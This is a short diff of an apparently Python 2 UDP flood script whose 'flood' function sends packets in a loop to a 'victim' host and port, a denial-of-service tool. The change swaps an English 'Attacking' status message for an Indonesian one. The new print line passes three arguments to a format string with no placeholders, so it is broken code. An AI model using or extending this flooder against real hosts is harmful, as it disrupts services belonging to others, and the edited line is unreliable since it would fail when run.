@@ -23,7 +23,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+        print "Paket Sedang OTW "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
